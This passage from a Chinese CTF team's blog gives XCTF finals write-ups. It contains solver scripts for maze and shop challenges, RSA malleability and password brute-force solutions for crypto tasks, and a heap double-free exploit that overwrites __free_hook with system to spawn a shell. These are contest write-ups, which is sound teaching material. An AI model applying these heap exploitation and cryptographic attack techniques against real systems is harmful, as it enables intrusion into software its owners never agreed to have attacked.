class="number">1</span>]:</span><br><span class="line">            idx = idx</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = idx - <span class="number">1</span></span><br><span class="line">        crr.append(idx)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> arr[i][idx] &gt; arr[i][idx+<span class="number">1</span>]:</span><br><span class="line">            m = idx</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = idx + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> arr[i][m] &gt; arr[i][idx-<span class="number">1</span>]:</span><br><span class="line">            m = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            m = idx - <span class="number">1</span></span><br><span class="line">        idx = m</span><br><span class="line">        crr.append(idx)</span><br><span class="line"></span><br><span class="line">crr = crr[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;111&#x27;</span>,io.recvline())</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">750</span>):</span><br><span class="line">    res = res + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(crr[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;res = <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">io.sendline(res[<span class="number">1</span>:].encode())</span><br><span class="line"><span class="built_in">print</span>(io.interactive())</span><br><span class="line"><span class="comment"># flag&#123;Y0u_@rE_tHe_G@mE_M@aSter_0f_m@Ze&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote,context</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5</span>(<span class="params">matrix</span>):</span><br><span class="line">    <span class="comment"># 分割成一个1*14和7*14的矩阵</span></span><br><span class="line">    row1, row2 = matrix[<span class="number">0</span>:<span class="number">1</span>, :], matrix[<span class="number">1</span>:, :]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算每一行与第一行差的和的绝对值</span></span><br><span class="line">    result = np.<span class="built_in">sum</span>(np.<span class="built_in">abs</span>(row2[<span class="number">1</span>:] - row2[<span class="number">0</span>]), axis=<span class="number">1</span>)</span><br><span class="line">    result = np.array(result)</span><br><span class="line">    min_value = np.<span class="built_in">min</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取最小值在数组中的位置</span></span><br><span class="line">    min_indices = np.where(result == min_value)[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(&quot;最小值&#123;&#125;在result中的位置是矩阵第&#123;&#125;行&quot;.format(min_value, min_indices + 1))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取最小值所在矩阵行的值</span></span><br><span class="line">    row = row2[min_indices]</span><br><span class="line">    <span class="comment"># print(row)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找到row1中值为0的位置</span></span><br><span class="line">    zero_indices = np.where(row1 == <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将0位置替换成row中对应位置的值</span></span><br><span class="line">    row1[zero_indices] = row[zero_indices]</span><br><span class="line">    <span class="comment"># print(row1)</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> row1[<span class="number">0</span>]])</span><br><span class="line">    <span class="comment"># print(flag)</span></span><br><span class="line">    flag_md5 = hashlib.md5(flag.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> flag_md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">    r = remote(<span class="string">&#x27;172.35.3.120&#x27;</span>,<span class="number">11409</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;please?&quot;</span>, <span class="string">b&quot;1234&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&quot;Please input your good number:&quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">b&quot;Please input your good number:&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    <span class="comment"># r.recvall()</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Your answer is(Y/N):&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;beginmatrix&#x27;</span>)</span><br><span class="line">    matrix = r.recvline().strip()</span><br><span class="line">    matrix = r.recvline().strip().decode()</span><br><span class="line">    matrix = matrix.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    matrix = [<span class="built_in">int</span>(i.strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>).strip(<span class="string">&#x27; &#x27;</span>).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> matrix]</span><br><span class="line">    <span class="comment"># print((matrix))</span></span><br><span class="line">    matrix = np.array(matrix)</span><br><span class="line">    matrix = matrix.reshape(<span class="number">8</span>,<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Now, what is your answer?&#x27;</span>,get_md5(matrix))</span><br><span class="line">    c = r.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">        <span class="built_in">print</span>(c)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="TSA"><a href="#TSA" class="headerlink" title="TSA"></a>TSA</h3><p>只需要向server发送$t^e\cdot c\;mod\;n$即可绕过限制，然后解得$t\cdot flag$，除以$t$就是flag了，exp中$t$取的2：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;172.35.3.154&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">n = <span class="built_in">int</span>(sh.recvline().decode())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c = sh.recvline()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">c = c[<span class="number">19</span>:-<span class="number">16</span>].decode()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">c = <span class="built_in">int</span>(c)</span><br><span class="line"></span><br><span class="line">t = <span class="built_in">pow</span>(<span class="number">2</span>,e,n) * c % n</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(t).encode())</span><br><span class="line"></span><br><span class="line">m = sh.recvline()</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">m = m[<span class="number">25</span>:-<span class="number">48</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)//<span class="number">2</span>))</span><br><span class="line"><span class="comment"># flag&#123;9162ac59-fc92-4937-8fef-1669cddcaacf&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h3><p>一个简单的三方安全协议，理论上知道两方的交互信息就能得到所有秘密，但是题目的形式偏向misc，很多表述不清楚，让人做的难受… 根据Save_Data()函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Save_Data</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment">#This is a default and optional function</span></span><br><span class="line">    <span class="comment">#Compress all data once rebuild the function&#x27;s answer</span></span><br><span class="line">    pwd=<span class="built_in">str</span>(datetime.datetime.now())</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>猜测压缩包密码大约就是在出题的时间附近，根据压缩包时间掩码爆破一下得到C的密码：<code>2022-08-27 20:16:17.930813</code>. 利用A C的信息能够还原flag，思路见exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Mul_loc_compute</span>(<span class="params">x1, y1, x2, y2</span>):</span><br><span class="line">    mulx = x1 * y1 + x1 * y2 + x2 * y1</span><br><span class="line">    <span class="keyword">return</span> mulx</span><br><span class="line"></span><br><span class="line">A0 = <span class="number">28829613228241459</span></span><br><span class="line"><span class="comment"># 利用C中的掩码计算Y02</span></span><br><span class="line">Y02 = <span class="number">924422050091362838179268571917871</span> - <span class="number">507036073644</span></span><br><span class="line">A00 = <span class="number">200254991086689</span></span><br><span class="line">A01 = <span class="number">200241552690281</span></span><br><span class="line">A02 = A0 - A00 - A01</span><br><span class="line">X00 = <span class="number">200058430391504</span></span><br><span class="line">X01 = <span class="number">200401773940794</span></span><br><span class="line">C02 = <span class="number">924422050091355025836012334663090</span></span><br><span class="line"><span class="comment"># 这里需要去理解函数Mul_loc_compute，他接收的参数是Ai和Xi作为xi和yi</span></span><br><span class="line">X02 = (C02 - A02 * X00) // (A02 + A00)</span><br><span class="line">X0 = X00 + X01 + X02</span><br><span class="line"></span><br><span class="line">B00 = <span class="number">199957680670222</span></span><br><span class="line">B01 = <span class="number">200362172648094</span></span><br><span class="line">B02 = Y02 - C02</span><br><span class="line">B0 = B00 + B01 + B02</span><br><span class="line"><span class="comment"># 三段拼接</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(A0))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(X0))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(B0))</span><br></pre></td></tr></table></figure>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="haslang"><a href="#haslang" class="headerlink" title="haslang"></a>haslang</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,size</span>):</span><br><span class="line">    menu()</span><br><span class="line">    sh.sendline(<span class="string">&quot;(define &quot;</span> + name + <span class="string">&quot; (alloc &quot;</span> + <span class="built_in">str</span>(size) + <span class="string">&quot;))&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">name</span>):</span><br><span class="line">    menu()</span><br><span class="line">    sh.sendline( <span class="string">&quot;(free &quot;</span> + name + <span class="string">&quot;)&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">name</span>):</span><br><span class="line">    menu()</span><br><span class="line">    sh.sendline( <span class="string">&quot;(showChunk &quot;</span> + name + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">    data = sh.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">name,off,content</span>):</span><br><span class="line">    menu()</span><br><span class="line">    sh.sendline( <span class="string">&quot;(editChunk &quot;</span> + name + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(off) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(content) + <span class="string">&quot;)&quot;</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sh = process(<span class="string">&quot;./haslang&quot;</span>)</span><br><span class="line">    <span class="comment"># sh = remote(&quot;172.35.3.90&quot;, &quot;9999&quot;)</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;a&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    add(<span class="string">&quot;b&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    free(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    edit(<span class="string">&quot;b&quot;</span>,<span class="number">0xa</span>,<span class="number">0x00</span>)</span><br><span class="line">    free(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    edit(<span class="string">&quot;b&quot;</span>,<span class="number">0xa</span>,<span class="number">0x00</span>)</span><br><span class="line">    free(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">&quot;d&quot;</span>,<span class="number">0x410</span>)</span><br><span class="line">    add(<span class="string">&quot;e&quot;</span>,<span class="number">0x410</span>)</span><br><span class="line">    free(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">    data= show(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(data) != <span class="number">5</span>):</span><br><span class="line">        sh.close()</span><br><span class="line">        log.info(data)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    libc_base = u64((<span class="string">b&quot;\xa0&quot;</span> + data).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3EBCA0</span></span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh = <span class="number">0x2f62696e2f7368</span> </span><br><span class="line">    log.success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    pause()</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">    edit(<span class="string">&quot;b&quot;</span>,<span class="number">0x0</span>,<span class="number">0xd0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        edit(<span class="string">&quot;d&quot;</span>,i,(((free_hook) &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span>))</span><br><span class="line">    </span><br><span class="line">    add(<span class="string">&quot;c&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    add(<span class="string">&quot;c&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    add(<span class="string">&quot;c&quot;</span>,<span class="number">0x50</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        edit(<span class="string">&quot;c&quot;</span>,i,(((system) &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        edit(<span class="string">&quot;a&quot;</span>,<span class="number">6</span>-i,(((bin_sh) &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span>))</span><br><span class="line">    free(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>
  </article>
  <aside class="table-content" id="site-toc">
  <div class="table-content-title">
    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
    <span>目录</span>
  </div>
  <div class="table-content-main">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-dbtrick"><span class="toc-text">web-dbtrick</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-text">0x01 预期解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E6%B8%85%E5%8D%8E%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E6%B3%95"><span class="toc-text">0x02 清华非预期解法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-text">基础用法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90"><span class="toc-text">绕过分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-signin"><span class="toc-text">web-signin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rev"><span class="toc-text">rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rev2-%E6%88%91%E4%B8%8D%E6%98%AF%E7%97%85%E6%AF%92"><span class="toc-text">rev2 我不是病毒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#maze"><span class="toc-text">maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shop"><span class="toc-text">shop</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TSA"><span class="toc-text">TSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Three"><span class="toc-text">Three</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#haslang"><span class="toc-text">haslang</span></a></li></ol></li></ol>
  </div>
</aside>
  
    <aside class="passage-copyright">
      <div>本文作者: SUers</div>
      
        <div>
          原文链接: 
          <a href="" target="_blank">https://team-su.github.io/2023/04/04/2023-03-29-XCTFfinals/</a>
        </div>
      
      <div>
        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
      </div>
    </aside>
  
  
    <div class="passage-tags">
     
      <a href="/tags/XCTFfinals/"><i class="fa fa-tags"></i>XCTFfinals</a>
    
    </div>
  
</div>

    </main>
    
    <div class="site-footer-wrapper">
  <footer class="site-footer">
    
    <div class="site-footer-info">
      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
    </div>
    
    
      <div class="site-footer-info">
        <i class="fa fa-at"></i> Email: suers_xctf@126.com
      </div>
    
    <div class="site-footer-info">
      <i class="fa fa-copyright"></i> 
      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
      All rights reserved.
    </div>
  </footer>
</div>
    <div id="site-layer" style="display:none;">
  <div class="site-layer-content">
    <div class="site-layer-header">
      <span class="site-layer-header-title" id="site-layer-title"></span>
      <i class="fa fa-close" id="site-layer-close"></i>
    </div>
    <div class="site-layer-body" id="site-layer-container">
      <div class="site-layer-input" id="site-layer-search" style="display: none;">
        <div class="site-layer-input-choose">
          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
        </div>
        <input type="text">
        <i class="fa fa-search"></i>
      </div>
      
      <div id="site-layer-welcome" style="display:none;"></div>
    </div>
  </div>
</div>
    

<div class="bottom-bar">
  <div class="bottom-bar-left">
    <a href="/2023/07/17/2023-07-15zer0ptsCTF/" data-enable="true">
      <i class="fa fa-arrow-left"></i>
    </a>
    <a href="/2023/01/10/2023-01-10-RWCTF/" data-enable="true">
      <i class="fa fa-arrow-right"></i>
    </a>
  </div>
  <div class="bottom-bar-right">
    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
      <i class="fa fa-bars"></i>
    </a>
    
    <a href="javascript:void(0);" id="site-toggle-share-btn">
      <i class="fa fa-share-alt"></i>
    </a>
    
    <a href="javascript:void(0);" id="back-top-btn">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>
</div>
    <div id="share-btn">
  
  
  
  
  
</div>
    
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-112937997-3"></script>
  <script async>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-112937997-3');
  </script>






    
  </body>
</html>